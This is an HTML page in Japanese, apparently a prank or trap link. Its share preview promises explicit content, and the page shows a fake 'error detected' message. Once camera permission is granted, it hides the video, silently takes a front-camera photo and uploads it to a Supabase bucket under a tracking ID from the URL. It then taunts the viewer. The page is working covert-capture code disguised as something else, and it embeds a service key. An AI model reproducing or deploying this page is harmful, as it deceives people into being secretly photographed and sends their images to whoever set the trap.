<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta property="og:title" content="真夏の夜の淫夢">
  <meta property="og:description" content="モザイク無しとありバージョンどちらか選べます。">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://ginginman-infinity.github.io/-/generate.html">
  <meta name="twitter:card" content="summary">

  <title>カメラ自動撮影</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #111;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .box {
      background: #000;
      padding: 25px;
      border-radius: 16px;
      text-align: center;
      width: 90%;
      max-width: 380px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
    }
    /* 👇 videoを完全に非表示にする */
    video {
      display: none;
    }
    #status {
      font-size: 0.95rem;
      color: #ccc;
      margin-top: 15px;
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>不自然なエラーを検知しました</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="status">アクセス許可をお願いします。</div>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

    const SUPABASE_URL = "https://hwwjnlprsntmdcytktbm.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const status = document.getElementById("status");

    // ✅ URLのidを取得（ID連携対応）
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get("id");
    if (!id) {
      alert("URLにIDが含まれていません。URL生成ツールから開いてください。");
      throw new Error("Missing ID");
    }

    // 1️⃣ ページ読み込み時にカメラ起動要求
    window.addEventListener("load", async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // 内カメ
          audio: false,
        });

        // videoは非表示だが、streamは利用する
        video.srcObject = stream;
        status.textContent = "撮影中...";

        // 少し待ってから自動撮影
        setTimeout(() => captureAndUpload(stream), 1500);
      } catch (err) {
        status.textContent = "不自然なエラーを検知しました、もう一度やり直してください。: " + err.message;
      }
    });

    // 2️⃣ 自動撮影＆Supabase送信
    async function captureAndUpload(stream) {
      try {
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));

        status.textContent = "読み込み中・・・";

        const { error } = await supabase.storage
          .from("photos")
          .upload(`${id}.jpg`, blob, { upsert: true });

        if (error) {
          status.textContent = "送信エラー: " + error.message;
        } else {
          status.innerHTML = `
            いい笑顔ですね<br>
            <a href="check.html?id=${id}" target="_blank" style="color:orange;">確認ページを開く</a>
          `;
        }

        stream.getTracks().forEach((t) => t.stop());
        video.srcObject = null;
      } catch (e) {
        status.textContent = "撮影エラー: " + e.message;
      }
    }
  </script>
</body>
</html>
